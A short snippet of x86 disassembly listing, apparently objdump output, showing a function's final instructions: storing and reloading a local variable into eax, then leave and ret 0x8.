  428c84:	mov    DWORD PTR [ebp-0x4],eax
  428c87:	mov    eax,DWORD PTR [ebp-0x4]
  428c8a:	leave  
  428c8b:	ret    0x8
